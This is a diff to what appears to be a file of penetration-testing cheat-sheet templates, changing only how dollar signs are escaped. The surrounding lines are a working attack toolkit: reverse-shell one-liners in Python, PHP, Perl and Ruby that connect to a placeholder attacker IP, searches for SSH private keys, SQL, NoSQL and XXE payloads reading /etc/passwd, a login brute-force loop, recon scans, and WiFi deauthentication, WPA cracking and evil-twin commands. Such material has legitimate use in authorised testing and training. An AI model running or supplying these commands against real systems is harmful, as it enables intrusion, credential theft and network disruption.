@@ -220,29 +220,29 @@ Host: target.com
 TARGET="[IP or DOMAIN]"
 OUTPUT_DIR="nmap_results"
 
-mkdir -p $OUTPUT_DIR
+mkdir -p \$OUTPUT_DIR
 
 # Quick scan
 echo "[+] Running quick scan..."
-nmap -sV -sC -oN $OUTPUT_DIR/quick.txt $TARGET
+nmap -sV -sC -oN \$OUTPUT_DIR/quick.txt \$TARGET
 
 # Full port scan
 echo "[+] Running full port scan..."
-nmap -p- -oN $OUTPUT_DIR/all_ports.txt $TARGET
+nmap -p- -oN \$OUTPUT_DIR/all_ports.txt \$TARGET
 
 # UDP scan (top 100)
 echo "[+] Running UDP scan..."
-sudo nmap -sU --top-ports 100 -oN $OUTPUT_DIR/udp.txt $TARGET
+sudo nmap -sU --top-ports 100 -oN \$OUTPUT_DIR/udp.txt \$TARGET
 
 # Service and OS detection
 echo "[+] Running detailed scan..."
-nmap -A -sV -sC -p- -oN $OUTPUT_DIR/detailed.txt $TARGET
+nmap -A -sV -sC -p- -oN \$OUTPUT_DIR/detailed.txt \$TARGET
 
 # Vulnerability scan
 echo "[+] Running vulnerability scripts..."
-nmap --script vuln -oN $OUTPUT_DIR/vulns.txt $TARGET
+nmap --script vuln -oN \$OUTPUT_DIR/vulns.txt \$TARGET
 
-echo "[+] Scans complete! Results in $OUTPUT_DIR/"
+echo "[+] Scans complete! Results in \$OUTPUT_DIR/"
 ''',
     ),
 
@@ -438,10 +438,10 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR_IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 
 ## PHP
-php -r '$sock=fsockopen("[YOUR_IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '\$sock=fsockopen("[YOUR_IP]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ## Perl
-perl -e 'use Socket;$i="[YOUR_IP]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;\$i="[YOUR_IP]";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 ## Ruby
 ruby -rsocket -e'f=TCPSocket.open("[YOUR_IP]",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@@ -515,14 +515,14 @@ find / -name authorized_keys 2>/dev/null
 find / -name id_rsa 2>/dev/null
 
 ## Kernel Exploits
-searchsploit linux kernel $(uname -r)
+searchsploit linux kernel \$(uname -r)
 
 ## Docker Escape
 docker ps
 ls -al /var/run/docker.sock
 
 ## PATH Hijacking
-echo $PATH
+echo \$PATH
 find / -perm -u=s -type f 2>/dev/null | xargs strings | grep -i "PATH"
 
 ## Capabilities
@@ -637,56 +637,56 @@ TARGET="[DOMAIN or IP]"
 
 ## Subdomain Enumeration
 echo "[+] Enumerating subdomains..."
-subfinder -d $TARGET -o subdomains.txt
-amass enum -d $TARGET -o amass_subdomains.txt
+subfinder -d \$TARGET -o subdomains.txt
+amass enum -d \$TARGET -o amass_subdomains.txt
 
 ## Directory Brute-forcing
 echo "[+] Directory brute-forcing..."
-gobuster dir -u https://$TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
-feroxbuster -u https://$TARGET -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u https://\$TARGET -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+feroxbuster -u https://\$TARGET -w /usr/share/wordlists/dirb/common.txt
 
 ## Technology Detection
 echo "[+] Detecting technologies..."
-whatweb https://$TARGET
-wappalyzer https://$TARGET
+whatweb https://\$TARGET
+wappalyzer https://\$TARGET
 
 ## Vulnerability Scanning
 echo "[+] Running Nikto..."
-nikto -h https://$TARGET -o nikto_results.txt
+nikto -h https://\$TARGET -o nikto_results.txt
 
 ## Web Crawler
 echo "[+] Crawling website..."
-gospider -s https://$TARGET -o gospider_output
+gospider -s https://\$TARGET -o gospider_output
 
 ## Parameter Discovery
 echo "[+] Finding parameters..."
-paramspider -d $TARGET -o parameters.txt
+paramspider -d \$TARGET -o parameters.txt
 
 ## JavaScript Analysis
 echo "[+] Extracting JavaScript files..."
-python3 getJS.py -u https://$TARGET -o js_files/
+python3 getJS.py -u https://\$TARGET -o js_files/
 
 ## Wayback URLs
 echo "[+] Fetching historical URLs..."
-waybackurls $TARGET > wayback.txt
+waybackurls \$TARGET > wayback.txt
 
 ## Screenshots
 echo "[+] Taking screenshots..."
-gowitness single https://$TARGET
+gowitness single https://\$TARGET
 
 ## SSL/TLS Check
 echo "[+] Checking SSL/TLS..."
-sslscan $TARGET
-testssl.sh $TARGET
+sslscan \$TARGET
+testssl.sh \$TARGET
 
 ## DNS Records
 echo "[+] DNS enumeration..."
-dig $TARGET ANY
-nslookup $TARGET
+dig \$TARGET ANY
+nslookup \$TARGET
 
 ## WHOIS
 echo "[+] WHOIS lookup..."
-whois $TARGET
+whois \$TARGET
 
 ## Notes
 Target: 
@@ -734,7 +734,7 @@ curl -X POST "https://api.example.com/admin/users" -H "Authorization: Bearer [US
 curl -X POST "https://api.example.com/search" -d '{"query":"test' OR '1'='1"}'
 
 # NoSQL Injection
-curl -X POST "https://api.example.com/login" -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+curl -X POST "https://api.example.com/login" -d '{"username":{"\$ne":null},"password":{"\$ne":null}}'
 
 # XXE
 curl -X POST "https://api.example.com/parse" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
@@ -744,7 +744,7 @@ curl -X POST "https://api.example.com/parse" -d '<?xml version="1.0"?><!DOCTYPE 
 ```bash
 # Brute force test
 for i in {1..1000}; do
-  curl -X POST "https://api.example.com/login" -d '{"username":"admin","password":"test'$i'"}'
+  curl -X POST "https://api.example.com/login" -d '{"username":"admin","password":"test'\$i'"}'
 done
 ```
 
@@ -789,46 +789,46 @@ CHANNEL="[TARGET_CHANNEL]"
 
 ## Monitor Mode
 echo "[+] Enabling monitor mode..."
-airmon-ng start $INTERFACE
+airmon-ng start \$INTERFACE
 
 ## Network Discovery
 echo "[+] Scanning for networks..."
-airodump-ng ${INTERFACE}mon
+airodump-ng \${INTERFACE}mon
 
 ## Capture Handshake
 echo "[+] Capturing handshake..."
-airodump-ng -c $CHANNEL --bssid $BSSID -w capture ${INTERFACE}mon
+airodump-ng -c \$CHANNEL --bssid \$BSSID -w capture \${INTERFACE}mon
 
 ## Deauth Attack (in new terminal)
-# aireplay-ng --deauth 10 -a $BSSID ${INTERFACE}mon
+# aireplay-ng --deauth 10 -a \$BSSID \${INTERFACE}mon
 
 ## WPA/WPA2 Cracking
 echo "[+] Cracking WPA/WPA2..."
-aircrack-ng -w /path/to/wordlist.txt -b $BSSID capture*.cap
+aircrack-ng -w /path/to/wordlist.txt -b \$BSSID capture*.cap
 
 ## WPS Attack
 echo "[+] Testing WPS..."
-wash -i ${INTERFACE}mon
-reaver -i ${INTERFACE}mon -b $BSSID -vv
+wash -i \${INTERFACE}mon
+reaver -i \${INTERFACE}mon -b \$BSSID -vv
 
 ## Client Deauth
 echo "[+] Deauthing clients..."
-aireplay-ng --deauth 0 -a $BSSID ${INTERFACE}mon
+aireplay-ng --deauth 0 -a \$BSSID \${INTERFACE}mon
 
 ## Evil Twin Setup
 echo "[+] Creating Evil Twin AP..."
-airbase-ng -e "FreeWiFi" -c $CHANNEL ${INTERFACE}mon
+airbase-ng -e "FreeWiFi" -c \$CHANNEL \${INTERFACE}mon
 
 ## Cleanup
 echo "[+] Cleaning up..."
-airmon-ng stop ${INTERFACE}mon
+airmon-ng stop \${INTERFACE}mon
 
 ## Tools
 # WiFite
-wifite --kill -i ${INTERFACE}mon
+wifite --kill -i \${INTERFACE}mon
 
 # Bettercap
-bettercap -iface ${INTERFACE}mon
+bettercap -iface \${INTERFACE}mon
 
 ## Notes
 Target SSID: 
